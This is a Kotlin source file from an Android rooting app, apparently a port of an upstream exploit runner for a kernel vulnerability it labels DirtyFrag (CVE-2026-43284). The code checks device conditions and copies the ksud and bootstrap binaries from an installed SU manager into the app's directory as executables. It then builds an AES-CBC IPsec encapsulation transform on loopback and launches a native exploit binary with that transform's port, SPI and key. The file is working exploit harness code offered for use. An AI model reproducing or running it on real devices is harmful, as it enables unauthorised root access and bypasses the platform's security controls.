package com.iqooneo8.dirtyfrag

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import java.io.File
import java.io.IOException
import java.net.DatagramSocket
import java.net.InetAddress
import java.nio.file.Files
import java.nio.file.StandardCopyOption
import java.security.SecureRandom

/**
 * DirtyFrag (CVE-2026-43284) 的 Kotlin 实现。
 * 行为对照上游 mitschud/DirtyFrag app/src/main/java/df/root/ExploitRunner.java。
 */
object DirtyFragRunner {
    private const val PREFS_NAME = "dfroot"
    private const val PREF_SU_MANAGER = "su_manager"
    private const val NATIVE_BIN = "libdfroot.so"

    private fun systemProperty(key: String, def: String): String = try {
        val cls = Class.forName("android.os.SystemProperties")
        cls.getMethod("get", String::class.java, String::class.java)
            .invoke(null, key, def) as? String ?: def
    } catch (_: Exception) {
        def
    }

    private fun hasKsud(app: android.content.pm.ApplicationInfo): Boolean {
        val dir = app.nativeLibraryDir ?: return false
        return File(dir, "libksud.so").exists()
    }

    /** 管理器已安装且自带 libksud.so，才能作为 ksud 来源。 */
    fun managerReady(pm: android.content.pm.PackageManager, pkg: String): Boolean {
        val app = runCatching { pm.getApplicationInfo(pkg, 0) }.getOrNull() ?: return false
        return hasKsud(app)
    }

    @Synchronized
    fun run(ctx: Context, reporter: IReporter): Int {
        if (File("/dev/df").exists()) {
            reporter.report("already hooked, skipping")
            return 0
        }
        reportDeviceInfo(ctx, reporter)

        val logTag = systemProperty("persist.log.tag", "")
        if (logTag.isNotEmpty() && logTag[0].uppercaseChar() == 'S') {
            reporter.report("ERROR: Developer Options -> 'Log buffer size' is set to Off.")
            reporter.report("Change it to any other value and retry.")
            return 2
        }

        val bin = File(ctx.applicationInfo.nativeLibraryDir, NATIVE_BIN)
        if (!bin.exists()) {
            reporter.report("$NATIVE_BIN missing from nativeLibraryDir")
            return 2
        }

        val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val suManager = prefs.getString(PREF_SU_MANAGER, null)
        if (suManager.isNullOrEmpty()) {
            reporter.report("no SU manager selected")
            return 2
        }
        val app = try {
            ctx.packageManager.getApplicationInfo(suManager, 0)
        } catch (_: Exception) {
            reporter.report("$suManager is no longer installed")
            return 2
        }
        if (!hasKsud(app)) {
            reporter.report("libksud.so not found in $suManager")
            return 2
        }

        stageAssets(ctx, suManager)

        val ipsec = ctx.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
            ?: throw IllegalStateException("IpSecManager unavailable (requires API 28+)")

        val encapSock = ipsec.openUdpEncapsulationSocket()
        val loopback = InetAddress.getByName("127.0.0.1")
        val spi = ipsec.allocateSecurityParameterIndex(loopback)
        val aesKey = ByteArray(32).also { SecureRandom().nextBytes(it) }
        val senderPort = DatagramSocket().use { it.localPort }

        val transform = IpSecTransform.Builder(ctx)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encapSock, senderPort)
            .buildTransportModeTransform(loopback, spi)

        return try {
            runBinary(bin, reporter, encapSock.port, spi.spi, aesKey, senderPort)
        } finally {
            transform.close()
            spi.close()
            encapSock.close()
        }
    }

    private fun reportDeviceInfo(ctx: Context, reporter: IReporter) {
        val version = try {
            @Suppress("DEPRECATION")
            ctx.packageManager.getPackageInfo(ctx.packageName, 0).versionName ?: "?"
        } catch (_: Exception) {
            "?"
        }
        reporter.report("app version: $version")
        reporter.report("manufacturer: ${Build.MANUFACTURER}")
        reporter.report("model: ${Build.MODEL}")
        reporter.report("android version: ${Build.VERSION.RELEASE}")
        reporter.report("security patch: ${Build.VERSION.SECURITY_PATCH}")
        reporter.report("kernel version: ${System.getProperty("os.version") ?: "unknown"}")
        reporter.report("")
    }

    private fun stageAssets(ctx: Context, suManagerPackage: String) {
        val app = ctx.packageManager.getApplicationInfo(suManagerPackage, 0)
        stageBin(ctx, File(app.nativeLibraryDir, "libksud.so"), "ksud")
        stageBin(ctx, File(ctx.applicationInfo.nativeLibraryDir, "libbootstrap.so"), "bootstrap")
    }

    private fun stageBin(ctx: Context, src: File, name: String) {
        if (!src.exists()) throw IOException("$src not found")
        val dest = File(ctx.filesDir.parentFile, name)
        Files.copy(src.toPath(), dest.toPath(), StandardCopyOption.REPLACE_EXISTING)
        if (!dest.setExecutable(true, false)) {
            throw IOException("setExecutable failed: ${dest.absolutePath}")
        }
    }

    private fun runBinary(
        bin: File,
        reporter: IReporter,
        encapPort: Int,
        spi: Int,
        aesKey: ByteArray,
        senderPort: Int
    ): Int {
        val cmd = mutableListOf(
            bin.absolutePath,
            "--encap-port", encapPort.toString(),
            "--sender-port", senderPort.toString(),
            "--spi", Integer.toUnsignedString(spi),
            "--aes-key", hex(aesKey)
        )
        val pb = ProcessBuilder(cmd)
        pb.redirectErrorStream(true)
        val p = pb.start()
        p.inputStream.bufferedReader().forEachLine { reporter.report(it) }
        return p.waitFor()
    }

    private fun hex(b: ByteArray): String {
        val sb = StringBuilder(b.size * 2)
        for (x in b) sb.append(String.format("%02x", x))
        return sb.toString()
    }
}
